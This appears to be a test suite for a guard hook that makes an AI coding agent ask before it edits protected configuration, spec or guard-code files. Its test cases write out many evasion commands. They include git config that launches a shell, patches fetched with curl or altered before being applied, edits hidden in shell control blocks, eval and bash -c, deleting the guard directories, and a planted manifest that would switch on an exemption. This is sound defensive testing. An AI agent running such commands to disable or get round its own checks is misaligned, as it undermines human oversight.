        ["git --config-env=alias.x=VAR x"],
        ["git --config-env alias.x=VAR x"],
        ["git --config-env=core.pager=VAR log"],
        ["git --config-env core.sshCommand=VAR fetch"],
        ["git --config-env=k=VAR status"],
        // um -c inofensivo junto de um perigoso: o perigoso decide
        ["git -c user.name=x -c alias.x=!sh x"],
        ["git -c core.pager=sh -c user.name=x log"],
      ])("%s → pede, o que o -c define pode rodar um programa", (command) => {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why, command).toMatch(/configuration that can run a program/);
      });

      it.each([
        ["git -c user.name=x status"],
        ["git -c user.email=x@y.z log"],
        ["git -c color.ui=always diff"],
        ["git -c color.diff=never diff"],
        ["git -c core.quotepath=false status"],
        ["git -c core.autocrlf=false status"],
        ["git -c core.safecrlf=false add ."],
        ["git -c core.eol=lf status"],
        ["git -c advice.detachedHead=false checkout main"],
        ["git -c init.defaultBranch=main init"],
        ["git -c commit.gpgsign=false commit -m x"],
        ["git -c tag.gpgsign=false tag v1"],
        ["git -c gc.auto=0 status"],
        ["git -c protocol.version=2 fetch"],
        ["git --config-env=user.name=NAME status"],
        ["git --config-env user.email=MAIL status"],
      ])("%s → uma chave inofensiva não pede", (command) => {
        expect(find(command), command).toBeNull();
      });
    });

    describe("a palavra do subcomando que não é de um builtin do git pede (lista fechada)", () => {
      it.each([
        ["git frobnicate"],
        ["git co feature"],
        ["git st"],
        ["git ./merge feature"],
        ["git merge2 feature"],
        ["git 'a b' c"],
        // scripts e programas externos: podem ser um alias ou um script no lugar do subcomando
        ["git lfs pull"],
        ["git submodule update --init"],
        ["git flow init"],
        ["git subtree add --prefix=x y main"],
        ["git svn rebase"],
        ["git scalar list"],
        ["git filter-branch --tree-filter 'sed -i x .claude/tier-rules.json' HEAD"],
        ["git difftool"],
        ["git mergetool"],
        ["git request-pull a b c"],
        ["git send-email x.patch"],
        ["git gui"],
        ["git gitk"],
        ["git citool"],
        ["git instaweb"],
        ["git stage ."],
      ])("%s → pede", (command) => {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why).toMatch(/not a git subcommand this guard knows/);
      });

      it.each([
        ["git"],
        ["git --version"],
        ["git -C d"],
        ["git status"],
        ["git status --short"],
        ["git log --oneline -5"],
        ["git diff HEAD~1"],
        ["git add -A"],
        ["git commit -m x"],
        ["git push origin main"],
        ["git fetch --all"],
        ["git branch -a"],
        ["git worktree add ../x"],
        ["git ls-files"],
        ["git rev-parse HEAD"],
        ["git config --get user.name"],
        ["git remote -v"],
        ["git show HEAD:SPEC.md"],
        ["git switch main"],
        ["git clean -n"],
        ["git bisect start"],
        ["git clone https://x/y.git"],
        ["git init"],
        ["git describe --tags"],
        ["git rm x"],
        ["git mv a b"],
        ["git tag v1"],
        ["git blame x"],
      ])("%s → um builtin (ou nenhum) não pede por isso", (command) => {
        expect(find(command), command).toBeNull();
      });

      // O subcomando é comparado como está escrito: no Windows `git Rebase` pode resolver para um `git-rebase` externo,
      // e uma palavra fora da lista exata cai no pedido de subcomando desconhecido.
      it.each([["git Rebase main"], ["git MERGE feature"], ["git Checkout -- SPEC.md"], ["git Stash pop"], ["git APPLY p.diff"], ["git Cherry-Pick abc"]])(
        "%s → pede: maiúscula não é um builtin conhecido",
        (command) => {
          const hit = find(command);
          expect(hit, command).not.toBeNull();
          expect(hit!.why).toMatch(/not a git subcommand this guard knows/);
        }
      );

      // O nome de um membro herdado de Object na posição do subcomando não lança e pede.
      it.each(["constructor", "__proto__", "hasOwnProperty", "toString", "valueOf", "isPrototypeOf"])("git %s → pede, sem exceção", (word) => {
        for (const command of [`git ${word} --x`, `git ${word} merge feature`, `git -C d ${word} -m x`, `git -c user.name=x ${word}`]) {
          let hit: ReturnType<typeof find> = null;
          expect(() => {
            hit = find(command);
          }, command).not.toThrow();
          expect(hit, command).not.toBeNull();
          expect(hit!.why).toMatch(/not a git subcommand this guard knows/);
        }
      });

      it("todos os subcomandos que o gitWrite trata estão na lista (senão pediriam sempre)", () => {
        for (const sub of ["stash", "apply", "am", "pull", "reset", "merge", "cherry-pick", "revert", "rebase", "checkout", "restore"]) {
          expect(find(`git ${sub} --abort-nada`)?.why ?? "", sub).not.toMatch(/not a git subcommand/);
        }
      });
    });
  });

  describe("o patch que muda antes de ser lido (TOCTOU)", () => {
    const files: Record<string, string> = {
      "ok.diff": "diff --git a/src/app.ts b/src/app.ts\n--- a/src/app.ts\n+++ b/src/app.ts\n@@ -1 +1 @@\n-a\n+b\n",
      "gate.diff": "--- a/SPEC.md\n+++ b/SPEC.md\n@@ -1 +1 @@\n-x\n+y\n",
      "rel.diff": "--- a/tier-rules.json\n+++ b/tier-rules.json\n@@ -1 +1 @@\n-x\n+y\n",
    };
    const read = (p: string): string | null => files[p] ?? null;
    const go = (command: string) => find(command, { read });

    it.each([
      ["printf x > p.patch && git apply p.patch"],
      ["echo y >> p.patch; git apply p.patch"],
      ["cat > p.patch <<'EOF'\n--- a/src/a.ts\n+++ b/src/a.ts\nEOF\ngit apply p.patch"],
      ["cp ok.diff p.patch && git apply p.patch"],
      ["mv ok.diff p.patch && git apply p.patch"],
      ["tee p.patch < ok.diff && patch -p1 < p.patch"],
      ["curl -o p.patch http://x/p && git apply p.patch"],
      ["sed -i 's/a/b/' ok.diff && git apply ok.diff"],
    ])("o arquivo do patch é escrito antes, no mesmo comando: %s → pede", (command) => {
      expect(go(command), command).not.toBeNull();
    });

    it.each([["cd sub && git apply ok.diff"], ["cd .. ; patch -p1 < ok.diff"], ["pushd x; git apply ok.diff; popd"], ["cd \"$D\" && git apply ok.diff"], ["Set-Location sub; git apply ok.diff"]])(
      "um cd/pushd antes do apply: %s → pede (o caminho significa outro arquivo lá)",
      (command) => {
        expect(go(command), command).not.toBeNull();
      }
    );

    it.each([
      ["git apply --directory=.claude rel.diff"],
      ["git apply --directory .claude rel.diff"],
      ["git apply --root=x rel.diff"],
      ["git apply -p2 ok.diff"],
      ["git apply -p0 ok.diff"],
      ["git apply -p 2 ok.diff"],
      ["git apply --strip=3 ok.diff"],
      ["patch -d .claude < rel.diff"],
      ["patch --directory=.claude -p0 < rel.diff"],
      ["patch -p2 < ok.diff"],
      ["patch -p0 < ok.diff"],
    ])("opção que muda a resolução dos caminhos: %s → pede", (command) => {
      expect(go(command), command).not.toBeNull();
    });

    it.each([["git apply ok.diff"], ["git apply -p1 ok.diff"], ["patch -p1 < ok.diff"], ["patch -p1 -i ok.diff"], ["git apply --check -p2 ok.diff"]])("sem nada disso, o patch lido vale: %s → não pede", (command) => {
      expect(go(command), command).toBeNull();
    });

    it("um patch lido que toca o gate pede, como antes", () => {
      expect(go("git apply gate.diff")).not.toBeNull();
    });

    it("o cwd acompanha o cd: um nome solto depois de entrar no .claude é o do gate", () => {
      expect(find("cd .claude && echo '{}' > tier-rules.json")).not.toBeNull();
      expect(find("cd .claude; cp x.json settings.json")).not.toBeNull();
      expect(find("pushd .claude && sed -i 's/a/b/' settings.local.json")).not.toBeNull();
      expect(find("Set-Location .claude; Set-Content tier-rules.json '{}'")).not.toBeNull();
      expect(find("cd docs && echo x > SPEC.md")).toBeNull();
      expect(find("cd src && echo x > notes.md")).toBeNull();
    });

    it("um cd que o guard não resolve (cd -, variável, glob, ~, popd): o nome solto do gate pede", () => {
      for (const command of ['cd "$X" && echo x > tier-rules.json', "cd - && echo x > settings.json", "cd ~ && echo x > .mcp.json", "cd sub* && echo x > SPEC.md", "popd; echo x > settings.local.json"]) {
        expect(find(command), command).not.toBeNull();
      }
      expect(find('cd "$X" && echo x > notes.md')).toBeNull();
    });
  });
});

// O código do próprio gate, num consumidor: o PO decidiu pedir ASK ali e não no upstream, onde o guard é desenvolvido.
// QA frente B, R2: as palavras de controle e o agrupamento do shell vêm DEPOIS de o splitter cortar em `;`, e o sub-comando
// começa por elas (`then sed -i ...`, `do cp ...`, `{ rm ...`, `(sed -i ...)`, `x) rm ...`): o programa é a palavra seguinte.
describe("gateWriteInCommand — palavras de controle e agrupamento antes do programa (QA frente B R2)", () => {
  const find = (command: string) => gateWriteInCommand(command, { split: splitSubCommands, cwd: CWD, isFrameworkRoot });

  it.each([
    // in-place no SPEC.md
    ["if grep -q 'false' SPEC.md; then sed -i 's/false/true/' SPEC.md; fi"],
    ["for i in 1; do sed -i 's/false/true/' SPEC.md; done"],
    ["while false; do sed -i 's/false/true/' SPEC.md; done"],
    ["until true; do sed -i 's/false/true/' SPEC.md; done"],
    ["{ sed -i 's/false/true/' SPEC.md; }"],
    ["( sed -i 's/false/true/' SPEC.md )"],
    ["(sed -i 's/false/true/' SPEC.md)"],
    ["((sed -i 's/false/true/' SPEC.md))"],
    ["( ( sed -i 's/false/true/' SPEC.md ) )"],
    ["! sed -i 's/false/true/' SPEC.md"],
    ["if true; then perl -pi -e 's/false/true/' SPEC.md; fi"],
    ["if false; then echo a; else sed -i 's/false/true/' SPEC.md; fi"],
    ["if false; then echo a; elif true; then sed -i 's/false/true/' SPEC.md; fi"],
    ["if sed -i 's/false/true/' SPEC.md; then echo ok; fi"],
    ["if false; then :; elif sed -i 's/false/true/' SPEC.md; then echo ok; fi"],
    ["until sed -i 's/false/true/' SPEC.md; do echo again; done"],
    ["true && { sed -i 's/false/true/' SPEC.md; }"],
    ["false || (sed -i 's/false/true/' SPEC.md)"],
    ["if true; then (sed -i 's/false/true/' SPEC.md); fi"],
    // arquivos do gate: cp, rm, mv, redirecionamento
    ["if true; then sed -i 's/head/main/' .claude/settings.json; fi"],
    ["for i in 1; do cp /tmp/x.json .claude/settings.json; done"],
    ["for i in 1; do rm .claude/settings.json; done"],
    ["for i in 1; do mv /tmp/x .claude/tier-rules.json; done"],
    ["{ cp /tmp/x SPEC.md; }"],
    ["(cp /tmp/x .claude/settings.json)"],
    ["(rm .claude/tier-rules.json)"],
    ["if true; then echo x > .claude/settings.json; fi"],
    // função e case
    ["f() { sed -i 's/false/true/' SPEC.md; }; f"],
    ["f () { sed -i 's/false/true/' SPEC.md; }"],
    ["function f { sed -i 's/false/true/' SPEC.md; }; f"],
    ["function f() { rm .claude/settings.json; }; f"],
    ["case x in x) sed -i 's/false/true/' SPEC.md;; esac"],
    ["case x in a) echo a;; x) sed -i 's/false/true/' SPEC.md;; esac"],
    ["case x in a|x) cp /tmp/x .claude/settings.json;; esac"],
    ["case x in *) rm .claude/tier-rules.json;; esac"],
    ["case x in (x) sed -i 's/false/true/' SPEC.md;; esac"],
    // eval lê a string como um comando, como o `sh -c`
    ["eval \"sed -i 's/false/true/' SPEC.md\""],
    ["eval 'rm .claude/settings.json'"],
    ["eval cp /tmp/x .claude/tier-rules.json"],
    ["if true; then eval \"sed -i 's/f/t/' SPEC.md\"; fi"],
  ])("%s → pede", (command) => {
    expect(find(command), command).not.toBeNull();
  });

  it.each([
    ["if grep -q 'false' SPEC.md; then echo ok; fi"],
    ["if [ -f SPEC.md ]; then cat SPEC.md; fi"],
    ["for f in a b; do cat SPEC.md; done"],
    ["for f in *.md; do sed -i 's/a/b/' $f; done"],
    ["while read l; do echo $l; done < SPEC.md"],
    ["{ echo hi; }"],
    ["(cd src && npm test)"],
    ["(sed -i 's/a/b/' src/app.ts)"],
    ["! grep -q x SPEC.md"],
    ["if true; then sed -i 's/a/b/' src/app.ts; fi"],
    ["case $x in a) echo a;; esac"],
    ["case x in x) sed -i 's/a/b/' README.md;; esac"],
    ["f() { echo hi; }; f"],
    ["function f { ls; }; f"],
    ["eval \"$(ssh-agent -s)\""],
    ["eval echo hi"],
    ["eval 'sed -i s/a/b/ src/app.ts'"],
    ["do_something SPEC.md"],
    ["thenx sed -i 's/a/b/' SPEC.md"],
    // uma palavra que só COMEÇA por uma de controle é outro programa: sem a fronteira, `dorm` viraria `do` + `rm`
    ["dorm .claude/settings.json"],
    ["iffy rm .claude/tier-rules.json"],
    ["thenrm SPEC.md"],
  ])("%s → não pede (o que não escreve no gate, ou palavra que só parece de controle)", (command) => {
    // `thenx sed -i ...` é um programa chamado `thenx` com argumentos, não o `then` seguido de sed.
    expect(find(command), command).toBeNull();
  });

  // Um limite atingido pede, nunca libera: o que o guard não consegue seguir até o fim não é "nada a ver".
  describe("o limite vira ask", () => {
    const SED = "sed -i 's/a/b/' SPEC.md";

    it("eval encadeado além da profundidade pede, com o sed -i do SPEC.md no fim ou não", () => {
      for (const command of [`${"eval ".repeat(5)}${SED}`, `${"eval ".repeat(8)}${SED}`, `${"eval ".repeat(4)}echo hi`, `${"eval ".repeat(5)}echo hi`]) {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why, command).toMatch(/too deep/);
      }
    });
    it("dentro da profundidade o eval se lê como antes", () => {
      expect(find(`${"eval ".repeat(3)}${SED}`)).not.toBeNull(); // pelo próprio sed -i
      expect(find(`${"eval ".repeat(3)}echo hi`)).toBeNull();
      expect(find("eval eval echo hi")).toBeNull();
    });
    it("o `sh -c` aninhado na mesma profundidade também pede", () => {
      expect(find(`bash -c "bash -c 'bash -c \\"bash -c ls\\"'"`)?.why).toMatch(/too deep/);
    });

    it("mais de 32 palavras de controle antes do programa pedem, com o sed -i do SPEC.md depois delas ou não", () => {
      for (const command of [
        `${"then ".repeat(33)}${SED}`,
        `${"then ".repeat(100)}${SED}`,
        `${"! ".repeat(40)}${SED}`,
        `${"( ".repeat(33)}${SED}${" )".repeat(33)}`,
        `${"(".repeat(40)}${SED}`,
        `${"if ".repeat(33)}echo hi`,
      ]) {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why, command).toMatch(/control words/);
      }
    });
    it("até 32 são lidas: o programa que vem depois é julgado como sempre", () => {
      expect(find(`${"then ".repeat(32)}${SED}`)).not.toBeNull();
      expect(find(`${"then ".repeat(32)}echo hi`)).toBeNull();
      expect(find(`${"! ".repeat(10)}echo hi`)).toBeNull();
    });
  });
});

describe("guardCodeMatcher — aiteam/hooks, o fecho dos imports e o template, só num consumidor", () => {
  const SRC: Record<string, string> = {
    "C:/consumer/aiteam/hooks/tier-guard.mjs": 'import * as fs from "fs";\nimport { a } from "../src/mod-a.mjs";\nconst b = await import("../src/mod-b.mjs");',
    "C:/consumer/aiteam/hooks/other-hook.mjs": 'import { c } from "../src/mod-c.mjs";',
    "C:/consumer/aiteam/src/mod-a.mjs": 'import { d } from "./mod-d.mjs";',
    "C:/consumer/aiteam/src/mod-b.mjs": "export const b = 1;",
    "C:/consumer/aiteam/src/mod-c.mjs": 'import "./mod-e.mjs";\nexport * from "./mod-f.mjs";',
    "C:/consumer/aiteam/src/mod-d.mjs": "// import { z } from './nao-conta.mjs'\nexport const d = 1;",
    "C:/consumer/aiteam/src/mod-e.mjs": "",
    "C:/consumer/aiteam/src/mod-f.mjs": "",
    "C:/consumer/aiteam/src/fora-do-fecho.mjs": "",
    "C:/consumer/aiteam/templates/tier-rules.json": "{}",
    "C:/upstream/tools/aiteam-sync/manifest.json": "{}",
    "C:/upstream/aiteam/hooks/tier-guard.mjs": 'import { a } from "../src/mod-a.mjs";',
    "C:/upstream/aiteam/src/mod-a.mjs": "",
  };
  const fsOps = {
    exists: (p: string) => p in SRC || Object.keys(SRC).some((k) => k.startsWith(`${p}/`)),
    read: (p: string) => SRC[p] ?? null,
    list: (dir: string) => Object.keys(SRC).filter((k) => k.startsWith(`${dir}/`) && !k.slice(dir.length + 1).includes("/")).map((k) => k.slice(dir.length + 1)),
  };
  const consumer = guardCodeMatcher("C:/consumer", fsOps);

  it.each([
    "C:/consumer/aiteam/hooks/tier-guard.mjs",
    "C:/consumer/aiteam/hooks/other-hook.mjs",
    "C:/consumer/aiteam/hooks/novo-hook-que-ainda-nao-existe.mjs",
    "C:/consumer/aiteam/src/mod-a.mjs",
    "C:/consumer/aiteam/src/mod-b.mjs",
    "C:/consumer/aiteam/src/mod-d.mjs",
    "C:/consumer/aiteam/src/mod-c.mjs",
    "C:/consumer/aiteam/src/mod-e.mjs",
    "C:/consumer/aiteam/src/mod-f.mjs",
    "C:/consumer/aiteam/templates/tier-rules.json",
    "c:\\consumer\\AITEAM\\Hooks\\tier-guard.mjs",
  ])("num consumidor, %s é o código do gate", (file) => {
    expect(consumer(file), file).toBe(true);
  });

  it.each([
    "C:/consumer/aiteam/src/fora-do-fecho.mjs",
    "C:/consumer/aiteam/src/mod-a.d.mts",
    "C:/consumer/aiteam/docs/guia.md",
    "C:/consumer/aiteam/hooks/sub/arquivo.mjs",
    "C:/consumer/aiteam/hooks/leia.md",
    "C:/consumer/src/mod-a.mjs",
    "C:/consumer/README.md",
    "C:/consumer/aiteam/templates/ci.yml.example",
  ])("não é: %s", (file) => {
    expect(consumer(file), file).toBe(false);
  });

  it("no upstream (upstream: true, da variável AITEAM_UPSTREAM) nada disso pede: o guard é desenvolvido ali", () => {
    const upstream = guardCodeMatcher("C:/upstream", fsOps, { upstream: true });
    for (const file of ["C:/upstream/aiteam/hooks/tier-guard.mjs", "C:/upstream/aiteam/src/mod-a.mjs", "C:/upstream/aiteam/templates/tier-rules.json"]) {
      expect(upstream(file), file).toBe(false);
    }
  });

  it("um arquivo marcador NÃO isenta: o tools/aiteam-sync/manifest.json que o agente cria num consumidor não liga o upstream", () => {
    // A mesma árvore: C:/upstream tem o manifest, e sem o `upstream: true` ele é um consumidor como outro qualquer.
    const planted = guardCodeMatcher("C:/upstream", fsOps);
    for (const file of ["C:/upstream/aiteam/hooks/tier-guard.mjs", "C:/upstream/aiteam/src/mod-a.mjs", "C:/upstream/aiteam/templates/tier-rules.json"]) {
      expect(planted(file), file).toBe(true);
    }
    // E `upstream` só vale quando é exatamente true: um valor truthy qualquer não liga a isenção.
    for (const value of ["1", 1, "true", {}]) {
      const m = guardCodeMatcher("C:/upstream", fsOps, { upstream: value as unknown as boolean });
      expect(m("C:/upstream/aiteam/hooks/tier-guard.mjs"), String(value)).toBe(true);
    }
  });

  it("uma worktree dentro de um consumidor é julgada como o consumidor, com manifest ou sem ele", () => {
    const wt: Record<string, string> = { ...SRC, "C:/consumer/.claude/worktrees/w1/aiteam/hooks/h.mjs": "", "C:/consumer/.claude/worktrees/w1/tools/aiteam-sync/manifest.json": "{}" };
    const ops = { ...fsOps, exists: (p: string) => p in wt || Object.keys(wt).some((k) => k.startsWith(`${p}/`)), read: (p: string) => wt[p] ?? null };
    const m = guardCodeMatcher("C:/consumer", ops);
    expect(m("C:/consumer/.claude/worktrees/w1/aiteam/hooks/h.mjs")).toBe(true);
    expect(m("C:/consumer/aiteam/hooks/tier-guard.mjs")).toBe(true);
  });

  it("um fs que lança vira um conjunto vazio: só o diretório de hooks e o template seguem valendo", () => {
    const boom = guardCodeMatcher("C:/x", { exists: () => { throw new Error("EIO"); }, read: () => null, list: () => [] });
    expect(() => boom("C:/x/aiteam/hooks/h.mjs")).not.toThrow();
  });

  it("o tipo guard-code: gateFileKind e o veredito de edição pedem, em qualquer ferramenta", () => {
    const options = { cwd: "C:/consumer", guardCode: consumer };
    expect(gateFileKind("aiteam/src/mod-a.mjs", options)).toBe("guard-code");
    expect(gateFileKind("aiteam/src/fora-do-fecho.mjs", options)).toBeNull();
    for (const [tool, input] of [
      ["Write", { file_path: "C:/consumer/aiteam/hooks/tier-guard.mjs", content: "x" }],
      ["Edit", { file_path: "C:/consumer/aiteam/src/mod-b.mjs", old_string: "1", new_string: "2" }],
      ["MultiEdit", { file_path: "C:/consumer/aiteam/templates/tier-rules.json", edits: [{ old_string: "{}", new_string: "[]" }] }],
    ] as const) {
      const v = gateEditVerdict({ tool, input, read: () => null, cwd: "C:/consumer", guardCode: consumer });
      expect(v, tool).toMatchObject({ kind: "guard-code" });
      expect(gateEditReason(v!)).toMatch(/gate's own code/);
    }
    expect(gateEditVerdict({ tool: "Write", input: { file_path: "C:/consumer/aiteam/src/fora-do-fecho.mjs", content: "x" }, read: () => null, cwd: "C:/consumer", guardCode: consumer })).toBeNull();
  });

  it("o shell: gravar nos arquivos do código do gate pede num consumidor", () => {
    const find = (command: string) => gateWriteInCommand(command, { split: splitSubCommands, cwd: "C:/consumer", guardCode: consumer });
    for (const command of ["echo x > aiteam/src/mod-a.mjs", "sed -i 's/a/b/' aiteam/hooks/tier-guard.mjs", "cp /tmp/x aiteam/templates/tier-rules.json", "rm aiteam/src/mod-b.mjs", "Set-Content aiteam/hooks/other-hook.mjs 'x'"]) {
      expect(find(command), command).toMatchObject({ kind: "guard-code" });
    }
    for (const command of ["echo x > aiteam/src/fora-do-fecho.mjs", "cat aiteam/src/mod-a.mjs", "cp aiteam/src/mod-a.mjs /tmp/x"]) expect(find(command), command).toBeNull();
    const up = guardCodeMatcher("C:/upstream", fsOps, { upstream: true });
    expect(gateWriteInCommand("echo x > aiteam/src/mod-a.mjs", { split: splitSubCommands, cwd: "C:/upstream", guardCode: up })).toBeNull();
  });

  // QA frente B, R3: apagar ou mover o DIRETÓRIO que guarda o código do gate (aiteam, aiteam/hooks, aiteam/src) o desliga
  // sem nomear um arquivo. Vale para apagar e mover; só num consumidor.
  describe("apagar ou mover aiteam, aiteam/hooks e aiteam/src pede num consumidor", () => {
    const find = (command: string, guardCode = consumer, cwd = "C:/consumer") => gateWriteInCommand(command, { split: splitSubCommands, cwd, guardCode });

    it.each([
      ["rm -r aiteam/hooks"],
      ["rm -rf aiteam/hooks/"],
      ["rm -rf aiteam"],
      ["rm -rf aiteam/"],
      ["rm -rf ./aiteam"],
      ["rm -r ./aiteam/src"],
      ["rm -rf aiteam/src aiteam/hooks"],
      ["rm -rf /tmp/x aiteam/src"],
      ["rm -rf C:/consumer/aiteam/hooks"],
      ["rm -rf C:\\consumer\\aiteam\\src"],
      ["rm -rf AITEAM/Hooks"],
      ["rmdir aiteam/hooks"],
      ["mv aiteam/hooks /tmp/away"],
      ["mv aiteam /tmp/away"],
      ["mv aiteam aiteam.old"],
      ["mv aiteam/src aiteam/src.off"],
      ["mv -f aiteam/hooks ../fora"],
      ["Remove-Item -Recurse aiteam\\hooks"],
      ["Remove-Item -Recurse -Force aiteam"],
      ["Remove-Item -Path aiteam\\src -Recurse"],
      ["Remove-Item -Path:aiteam\\src -Recurse"],
      ["ri -r aiteam/hooks"],
      ["Rename-Item aiteam\\hooks hooks.off"],
      ["Move-Item aiteam\\src C:\\tmp\\src"],
      ["rd /s /q aiteam\\src"],
      ["del /s /q aiteam\\hooks"],
      // depois de um cd, o caminho é outro
      ["cd aiteam && rm -rf src"],
      ["cd aiteam && rm -rf hooks"],
      ["cd aiteam && rm -rf ."],
      ["cd aiteam/src && rm -rf ../src"],
      // dentro de uma worktree do consumidor
      ["rm -rf .claude/worktrees/w1/aiteam/hooks"],
      // dentro de um bloco ou de um shell
      ["if true; then rm -rf aiteam/hooks; fi"],
      ["bash -c 'rm -rf aiteam/src'"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.kind, command).toBe("guard-code");
    });

    it.each([
      ["rm -rf aiteam/node_modules"],
      ["rm -rf aiteam/docs"],
      ["rm -rf aiteam/hooks/sub"],
      ["rm -rf aiteam/src/fora-do-fecho.mjs"],
      ["rm -rf aiteam.bak"],
      ["rm -rf tmp/aiteam-x"],
      ["rm -rf node_modules"],
      ["rm -rf src"],
      ["rm -rf hooks"],
      ["mv aiteam/docs aiteam/old-docs"],
      ["mv src/mod-a.mjs src/mod-a2.mjs"],
      ["mv x.txt aiteam/docs/"],
      ["ls aiteam"],
      ["ls -la aiteam/hooks"],
      ["cat aiteam/hooks/tier-guard.mjs"],
      ["cp -r aiteam /tmp/backup"],
      ["cd aiteam && npm test"],
      ["cd aiteam && rm -rf node_modules"],
      ["npm --prefix aiteam run test"],
    ])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });

    it("no upstream (o guard é desenvolvido ali) nada disso pede", () => {
      const up = guardCodeMatcher("C:/upstream", fsOps, { upstream: true });
      for (const command of ["rm -r aiteam/hooks", "rm -rf aiteam", "mv aiteam/src /tmp/x", "Remove-Item -Recurse aiteam\\hooks", "cd aiteam && rm -rf src"]) {
        expect(find(command, up, "C:/upstream"), command).toBeNull();
      }
    });

    it("um matcher sem o método (um guardCode de outro lugar) segue funcionando: só os arquivos valem", () => {
      const plain = (p: string) => consumer(p);
      expect(find("rm -rf aiteam/hooks", plain)).toBeNull();
      expect(find("rm aiteam/src/mod-b.mjs", plain)).toMatchObject({ kind: "guard-code" });
    });

    it("o método do matcher: só os três diretórios, exatos, e só num consumidor", () => {
      const isDir = (consumer as unknown as { isGuardDirectory: (p: string) => boolean }).isGuardDirectory;
      for (const p of ["C:/consumer/aiteam", "C:/consumer/aiteam/hooks", "C:/consumer/aiteam/src", "c:\\consumer\\AITEAM\\Hooks", "C:/consumer/.claude/worktrees/w1/aiteam/src"]) expect(isDir(p), p).toBe(true);
      for (const p of ["C:/consumer/aiteam/docs", "C:/consumer/aiteam/hooks/sub", "C:/consumer/aiteam/src/mod-a.mjs", "C:/consumer/src", "C:/consumer", "C:/consumer/aiteam2", "C:/consumer/x-aiteam"]) expect(isDir(p), p).toBe(false);
      const up = guardCodeMatcher("C:/upstream", fsOps, { upstream: true }) as unknown as { isGuardDirectory: (p: string) => boolean };
      expect(up.isGuardDirectory("C:/upstream/aiteam/hooks")).toBe(false);
    });
  });

  it("código inline de um interpretador que nomeia e grava no código do gate pede, como para os outros arquivos do gate", () => {
    const find = (command: string, guardCode = consumer, cwd = "C:/consumer") => gateWriteInCommand(command, { split: splitSubCommands, cwd, guardCode });
    for (const command of [
      "node -e \"require('fs').writeFileSync('aiteam/src/mod-a.mjs','')\"",
      "node -e \"require('fs').appendFileSync('./aiteam/hooks/tier-guard.mjs','x')\"",
      "python3 -c \"open('aiteam/hooks/other-hook.mjs','w').write('')\"",
      "bash -c \"echo x > aiteam/src/mod-a.mjs\"",
      "node -e \"fs.unlinkSync('aiteam\\\\src\\\\mod-b.mjs')\"",
    ]) expect(find(command), command).toMatchObject({ kind: "guard-code" });
    // Ler não pede, nomear um arquivo fora do fecho não pede, e no upstream nada disso é o gate.
    for (const command of [
      "node -e \"console.log(require('fs').readFileSync('aiteam/src/mod-a.mjs','utf8'))\"",
      "node -e \"require('fs').writeFileSync('aiteam/src/fora-do-fecho.mjs','')\"",
      "node -e \"require('fs').writeFileSync('docs/mod-a.mjs','')\"",
    ]) expect(find(command), command).toBeNull();
    const up = guardCodeMatcher("C:/upstream", fsOps, { upstream: true });
    expect(find("node -e \"require('fs').writeFileSync('aiteam/src/mod-a.mjs','')\"", up, "C:/upstream")).toBeNull();
  });
});
